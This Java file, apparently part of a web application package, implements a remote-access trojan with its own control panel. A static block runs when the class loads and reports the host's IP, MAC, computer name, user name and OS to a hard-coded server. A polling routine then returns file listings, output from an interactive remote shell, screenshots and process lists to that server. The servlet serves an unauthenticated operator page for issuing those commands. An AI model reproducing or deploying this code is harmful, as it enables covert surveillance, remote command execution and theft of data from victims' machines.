package tea.ui.site;

import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;
import java.util.*;
import tea.entity.*;
import java.net.*;
import java.awt.*;
import java.util.regex.*;
import java.awt.image.*;
import javax.imageio.*;
import java.sql.SQLException;
import tea.db.DbAdapter;
import sun.misc.*;

public class MTC extends HttpServlet
{
    public void service(HttpServletRequest request,HttpServletResponse response) throws ServletException,IOException
    {
        response.setContentType("text/html; charset=UTF-8");
        Http h = new Http(request);

        ServletContext application = getServletContext();
        String act = h.get("act"),nexturl = h.get("nexturl","");
        PrintWriter out = response.getWriter();
        try
        {
            Bean t = Bean.find(h.get("mac"));
            if("reg".equals(act))
            {
                t.name = h.get("name");
                t.username = h.get("username");
                t.ip0 = h.get("ip");
                t.ip1 = request.getRemoteAddr();
                t.os = h.get("os");
                t.time1 = (int) (System.currentTimeMillis() / 1000);
                if(t.time == null)
                    t.time = new Date();
                t.set();
            } else if("get".equals(act))
            {
                out.print(t.act + " " + t.data0);
                if("term".equals(t.act))
                {
                    t.data0 = "";
                    t.data1 += h.get("data");
                } else
                    t.data1 = h.get("data");
                t.time1 = (int) (System.currentTimeMillis() / 1000);
                if(t.time1 - t.time0 > 60)
                    t.act = null;
                t.set();
            } else if("data".equals(act))
            {
                out.print(t.data1);
                t.time0 = (int) (System.currentTimeMillis() / 1000);
                t.data1 = "";
                t.set();
            } else
            {
                if(t.mac != null)
                {
                    t.act = act;
                    t.data0 = h.get("data");
                    t.set();
                }
                out.println("<style>");
                out.println("table{width:100%; border:1px solid #bbd7e6;}");
                out.println("th{border-bottom:1px solid #bbd7e6; background-color:#E1ECFE;}");
                out.println("</style>");
                out.println("<script>");
                out.println("var mt={act:function(a,d)");
                out.println("{");
                out.println("  form2.act.value=a;");
                out.println("  form2.data.value=d;form2.target='';");
                out.println("  if(a=='file')");
                out.println("  {");
                out.println("    ");
                out.println("  }else if(a=='term')");
                out.println("  {");
                out.println("    var k=event.keyCode;if(k==13){form2.target='_ajax';}else if(k>0)return;");
                out.println("  }");
                out.println("  form2.submit();");
                out.println("},send:function(u,d)");
                out.println("{");
                out.println("  var a=null;");
                out.println("  if(window.ActiveXObject)");
                out.println("  {");
                out.println("    a=new ActiveXObject('Msxml2.XMLHTTP');");
                out.println("    if(!a)a=new ActiveXObject('Msxml2.XMLHTTP');");
                out.println("  }else if(window.XMLHttpRequest)a=new XMLHttpRequest();");
                out.println("  if(d)a.onreadystatechange=function(){if(a.readyState==4)d(a.responseText)};");
                out.println("  a.open('GET',u,true);");
                out.println("  a.send('');");
                out.println("},ajax:function()");
                out.println("{");
                out.println("  setInterval(function()");
                out.println("  {");
                out.println("    mt.send('?mac='+form2.mac.value+'&act=data',function(d)");
                out.println("    {");
                out.println("      if(!d)return;");
                out.println("      var a=form2.act.value,t=document.getElementById(a);if(!t)return;");
                out.println("      if(a=='term')");
                out.println("        t.innerHTML+=d.replace(/</g,'&lt;');");
                out.println("      else if(a=='scre')");
                out.println("        t.src='data:image/png;base64,'+d;");
                out.println("      else");
                out.println("        t.innerHTML=d;");
                out.println("    });");
                out.println("  },2000);");
                out.println("}};");
                out.println("window.onbeforeunload=function(e){console.log('test');};");
                out.println("</script><iframe name='_ajax' style='display:none'></iframe>");
                out.print("<form name='form2' action='?' target='_ajax'>");
                out.print("<input type='hidden' name='mac' value='" + t.mac + "'>");
                out.print("<input type='hidden' name='data' value='" + t.data0 + "'>");
                if("list".equals(act))
                {
                    out.print("<input type='hidden' name='act'>");
                    out.print("<table>");
                    out.print("<tr><th><th>机器名/用户名<th>IP地址<th>MAC地址<th>操作系统<th>时间<th>操作");
                    ArrayList al = Bean.find("",0,Integer.MAX_VALUE);
                    for(int i = 0;i < al.size();i++)
                    {
                        t = (Bean) al.get(i);
                        out.print("<tr onmouseover=bgColor='#EAF1F9' onmouseout=bgColor=''><td><a href='?act=view&mac=" + t.mac + "'>" + (i + 1) + "</a><td>" + t.name + "/" + t.username + "<td>" + t.ip0 + "/" + t.ip1 + "<td>" + t.mac + "<td>" + t.os + "<td>" + MT.f(t.time,1) + "<td><select onchange=form2.mac.value='" + t.mac + "';mt.act(value,'')><option value=''><option value='file'>文件<option value='term'>命令<option value='scre'>屏幕</select>");
                    }
                    out.print("</table>");
                } else
                {
                    out.print("<select name='act' onchange=mt.act(value,'')><option value='list'>列表<option value='file'>文件<option value='term'>命令<option value='scre'>屏幕<option value='task'>任务</select>");
                    if("file".equals(act)) //文件
                    {
                        int j = t.data0.lastIndexOf('/');
                        if(t.data0.length() > 1)
                            out.print("<input type='button' value='向上' onclick=\"mt.act('file','" + (j == -1 ? "" : t.data0.substring(0,j)) + "')\" />");
                        out.print("<table>");
                        out.print("<tr><th>文件名<th>大小<th>修改日期");
                        out.print("<tbody id=file></tbody>");
                        out.print("</table>");
                    } else if("term".equals(act)) //命令
                    {
                        if(t.data0.length() > 0)
                        {
                            out.print("<script>parent.document.form2.ta.value='';</script>");
                            return;
                        }
                        out.print("<table>");
                        out.print("<tr><td><pre id='term'></pre><textarea name='ta' cols='50' rows='5' onkeydown=mt.act('term',value)></textarea>");
                        out.print("</table>");
                    } else if("scre".equals(act)) //屏幕
                    {
                        out.print("<br/><img id='scre' src='data:image/png;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEHAAEALAAAAAABAAEAAAICTAEAOw==' />");
                    } else if("task".equals(act)) //任务
                    {
                        out.print("<input type='button' name='multi' value='结束进程' onclick=mt.act('task.kill'); />");
                        out.print("<table>");
                        out.print("<tbody id=task></tbody>");
                        out.print("</table>");
                    } else if("view".equals(act)) //详细
                    {
                        out.print("<table>");
                        out.print("<tr><td>机器名/用户名<td>" + t.name + "/" + t.username);
                        out.print("<tr><td>IP地址<td>" + t.ip0 + "/" + t.ip1);
                        out.print("<tr><td>MAC地址<td>" + t.mac);
                        out.print("<tr><td>操作系统<td>" + t.os);
                        out.print("<tr><td>联机时间<td>" + MT.f(new Date(t.time1 * 1000),1));
                        out.print("<tr><td>注册时间<td>" + MT.f(t.time,1));
                        out.print("</table>");
                    }
                    out.print("<script>form2.act.value='" + act + "';mt.ajax()</script>");
                }
                out.print("</form>");
            }
        } catch(Throwable ex)
        {
            out.print("<textarea id='ta'>" + ex.toString() + "</textarea><script>mt.show(document.getElementById('ta').value,1,'出现未知错误！');</script>");
            ex.printStackTrace();
        } finally
        {
            out.close();
        }
    }


    public static void main(String[] args) throws Exception
    {
        String str = new BASE64Encoder().encode(Filex.read("F:/b.gif"));
        System.out.println(str);
    }

    static String IP,MAC,HOST = "LIU_DEL".equals(System.getenv("COMPUTERNAME")) ? "127.0.0.1" : "202.85.221.166";
    static
    {
        try
        {
            if(Float.parseFloat(System.getProperty("java.specification.version","1.5")) < 1.6)
            {
                String str = OS.exec("ipconfig /all");
                String[] arr = str.split("Ethernet adapter ");
                for(int i = 1;i < arr.length;i++)
                {
                    Matcher m = Pattern.compile("(Physical Address|IP Address)[. ]+: ([^\r\n]+)").matcher(arr[i]);
                    if(m.find())
                    {
                        MAC = m.group(2);
                        if(m.find())
                        {
                            IP = m.group(2);
                            break;
                        }
                    }
                }
            } else
            {
                Enumeration e = NetworkInterface.getNetworkInterfaces();
                while(e.hasMoreElements())
                {
                    NetworkInterface ni = (NetworkInterface) e.nextElement();
                    //当不是回环网卡，并且启动，并且不是虚拟网卡
                    if(f(ni,"isLoopback") || !f(ni,"isUp") || f(ni,"isVirtual"))
                        continue;

                    byte[] by = (byte[]) ni.getClass().getMethod("getHardwareAddress").invoke(ni);
                    String str = Enc.enc(by);
                    if("00000000000000e0".equals(str)) //隧道适配器
                        continue;

                    Enumeration e2 = ni.getInetAddresses();
                    while(e2.hasMoreElements())
                    {
                        InetAddress ia = (InetAddress) e2.nextElement();
                        IP = ia.getHostAddress();
                        if(IP.indexOf(':') == -1)
                        {
                            MAC = str;
                            break;
                        }
                    }
                }
            }
            Http.open("http://" + HOST + "/MTC.do?act=reg&ip=" + IP + "&mac=" + MAC + "&name=" + Http.enc(System.getenv("COMPUTERNAME")) + "&os=" + Http.enc(System.getProperty("os.name")) + "&username=" + Http.enc(System.getProperty("user.name")),null);
        } catch(Throwable ex)
        {
            ex.printStackTrace();
        }
    }

    static Process pr;
    static StringBuilder sb = new StringBuilder();
    static int HASH;
    public static void run()
    {
        try
        {
            String htm = sb.toString();
            int hash = htm.hashCode();
            htm = (String) Http.open("http://" + HOST + "/MTC.do?act=get&mac=" + MAC,null,"data=" + (hash == HASH ? "" : Http.enc(htm)))[1];
            HASH = hash;
            sb.setLength(0);
            String act = htm.substring(0,4),str = htm.substring(5);
            if("file".equals(act))
            {
                File[] fs = str.length() < 2 ? File.listRoots() : new File(str).listFiles();
                if(fs == null)
                    sb.append("<tr><td>不存在或没有权限！");
                else if(fs.length == 0)
                    sb.append("<tr><td>空文件夹！");
                else
                {
                    StringBuilder td = new StringBuilder();
                    for(int i = 0;i < fs.length;i++)
                    {
                        String name = fs[i].getName(),path = fs[i].getPath().replace('\\','/');
                        (fs[i].isDirectory() ? sb : td).append("<tr><td><a href=javascript:mt.act('file','" + Http.enc(path) + "')><img src='/tea/image/ico/" + (fs[i].isDirectory() ? "" : name.substring(name.lastIndexOf('.') + 1)).toLowerCase() + ".gif' />" + (str.length() < 2 ? path : name) + "</a>" +
                                "<td>" + MT.f(fs[i].length() / 1024F,2) + "K" +
                                "<td>" + MT.f(new Date(fs[i].lastModified()),1));
                    }
                    sb.append(td);
                }
            } else if("term".equals(act))
            {
                HASH = 0;
                if(pr == null)
                {
                    boolean isWin = System.getProperty("os.name").startsWith("Windows ");
                    String shell = System.getenv(isWin ? "ComSpec" : "SHELL");
                    if(shell == null)
                        shell = isWin ? "cmd" : "bash";
                    pr = new ProcessBuilder(new String[]
                                            {shell,"-i"}).redirectErrorStream(true).start();
                }
                try
                {
                    if(str.length() > 0)
                    {
                        BufferedOutputStream os = (BufferedOutputStream) pr.getOutputStream();
                        os.write((str + "\n").getBytes());
                        os.flush();
                    }
                    BufferedInputStream is = (BufferedInputStream) pr.getInputStream();
                    for(int i = 0;i < 10;i++) //sb.length() == 0 || sb.charAt(sb.length() - 1) != '>'
                    {
                        while(is.available() > 0)
                        {
                            byte[] by = new byte[is.available()];
                            is.read(by);
                            sb.append(new String(by));
                        }
                        Thread.sleep(200);
                    }
                } catch(IOException ex)
                {
                    String err = ex.getMessage();
                    if("Broken pipe".equals(err) || "管道正在被关闭。".equals(err))
                    {
                        pr = null;
                        err = "<已退出>";
                    }
                    sb.append(err);
                }
//                if(str.equalsIgnoreCase("exit"))
//                {
//                    pr.destroy();
//                    sb.append(pr.exitValue() + "/退出成功！");
//                }
//                System.out.println("返回：" + sb.toString());
            } else if("scre".equals(act))
            {
                Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
                Robot r = new Robot();
                int w = (int) d.getWidth(),h = (int) d.getHeight();
                BufferedImage bi = r.createScreenCapture(new Rectangle(d));
                BufferedImage tag = new BufferedImage(w / 2,h / 2,BufferedImage.TYPE_INT_RGB);
                Graphics g = tag.getGraphics();
                g.drawImage(bi.getScaledInstance(w / 2,h / 2,Image.SCALE_SMOOTH),0,0,null);
                g.dispose();

                ByteArrayOutputStream ba = new ByteArrayOutputStream();
                ImageIO.write(tag,"PNG",ba);
                ba.close();
                sb.append(new BASE64Encoder().encode(ba.toByteArray()));
            } else if("task".equals(act))
            {
                str = exec(isWin ? "tasklist /v /fo csv" : "ps uax",null);
                String trs[] = str.trim().split("\n");
                for(int i = 0;i < trs.length;i++)
                {
                    if(trs[i].startsWith("\"tasklist.exe\""))
                        continue;
                    String tds[] = trs[i].split(isWin ? "\",\"" : " +");
                    sb.append("<tr onmouseover=bgColor='#BCD1E9' onmouseout=bgColor=''><t" + (i == 0 ? 'h' : 'd') + "><input type='checkbox' name='ps' value='" + tds[1] + "' onclick=if(value=='PID')s(checked)>");
                    for(int j = 0;j < tds.length;j++)
                    {
                        if(!isWin)
                        {
                            if(tds[j].charAt(0) == '/') // linux: 绝对路径中取名称
                            {
                                int x = tds[j].lastIndexOf("/");
                                if(x != -1)
                                    tds[j] = tds[j].substring(x + 1);
                            }
                        }
                        if(j == 0)
                            tds[j] = tds[j].substring(1);
                        else if(j == tds.length - 1)
                            tds[j] = tds[j].substring(0,tds[j].length() - 2);
                        else if(j == 6)
                            tds[j] = tds[j].substring(tds[j].indexOf('\\') + 1);
                        sb.append("<t" + (i == 0 ? 'h' : 'd'));
                        if(j == 4)
                            sb.append(" class='r'");
                        sb.append(">");
                        sb.append(tds[j]);
                    }
                    sb.append("</tr>\n");
                }
            }
        } catch(Throwable ex)
        {
            ex.printStackTrace();
        }
    }

    static boolean f(Object t,String f) throws Exception
    {
        Class c = t.getClass();
        return((Boolean) c.getMethod(f).invoke(t)).booleanValue();
    }

    static final boolean isWin = System.getProperty("os.name").startsWith("Windows ");

    static String exec(String cmd,Writer out) throws IOException
    {
        StringBuffer sb = new StringBuffer();
        int len = 0;
        byte by[] = new byte[cmd.length() * 10];
        Process p = new ProcessBuilder(cmd.split(" ")).redirectErrorStream(true).start();
        InputStream is = p.getInputStream();
        while((len = is.read(by)) != -1)
        {
            String str = new String(by,0,len);
            if(out != null)
            {
                out.write(str);
                out.flush();
            }
            sb.append(str);
        }
        is.close();
        return sb.toString();
    }

    ////
    static class Bean
    {
        String name;
        String username;
        String ip0; //本机IP
        String ip1; //出口IP
        String mac;
        String os;
        String act;
        String data0,data1; //0:我方 1:对方
        int time0,time1;
        Date time;
        Bean(String mac)
        {
            this.mac = mac;
        }

        public static Bean find(String mac) throws SQLException
        {
            ArrayList al = find(" AND mac=" + DbAdapter.cite(mac),0,1);
            return al.size() < 1 ? new Bean(mac) : (Bean) al.get(0);
        }

        public static ArrayList find(String sql,int pos,int size) throws SQLException
        {
            ArrayList al = new ArrayList();
            DbAdapter db = new DbAdapter();
            try
            {
                java.sql.ResultSet rs = db.executeQuery("SELECT mac,name,username,ip0,ip1,os,act,data0,data1,time0,time1,time FROM mtc WHERE 1=1" + sql,pos,size);
                while(rs.next())
                {
                    int i = 1;
                    Bean t = new Bean(rs.getString(i++));
                    t.name = rs.getString(i++);
                    t.username = rs.getString(i++);
                    t.ip0 = rs.getString(i++);
                    t.ip1 = rs.getString(i++);
                    t.os = rs.getString(i++);
                    t.act = rs.getString(i++);
                    t.data0 = rs.getString(i++);
                    t.data1 = rs.getString(i++);
                    t.time0 = rs.getInt(i++);
                    t.time1 = rs.getInt(i++);
                    t.time = db.getDate(i++);
                    al.add(t);
                }
                rs.close();
            } finally
            {
                db.close();
            }
            return al;
        }

        public void set() throws SQLException
        {
            DbAdapter db = new DbAdapter();
            try
            {
                int j = db.executeUpdate("UPDATE mtc SET name=" + DbAdapter.cite(name) + ",username=" + DbAdapter.cite(username) + ",ip0=" + DbAdapter.cite(ip0) + ",ip1=" + DbAdapter.cite(ip1) + ",os=" + DbAdapter.cite(os) + ",act=" + DbAdapter.cite(act) + ",data0=" + DbAdapter.cite(data0) + ",data1=" + DbAdapter.cite(data1) + ",time0=" + time0 + ",time1=" + time1 + ",time=" + DbAdapter.cite(time) + " WHERE mac=" + DbAdapter.cite(mac));
                if(j < 1)
                    db.executeUpdate("INSERT INTO mtc(mac,name,username,ip0,ip1,os,act,data0,data1,time0,time1,time)VALUES(" + DbAdapter.cite(mac) + "," + DbAdapter.cite(name) + "," + DbAdapter.cite(username) + "," + DbAdapter.cite(ip0) + "," + DbAdapter.cite(ip1) + "," + DbAdapter.cite(os) + "," + DbAdapter.cite(act) + "," + DbAdapter.cite(data0) + "," + DbAdapter.cite(data1) + "," + time0 + "," + time1 + "," + DbAdapter.cite(time) + ")");
            } finally
            {
                db.close();
            }
        }

        public void set(String f,String v) throws SQLException
        {
            DbAdapter.execute("UPDATE mtc SET " + f + "=" + DbAdapter.cite(v) + " WHERE mac=" + DbAdapter.cite(mac));
        }

    }

}
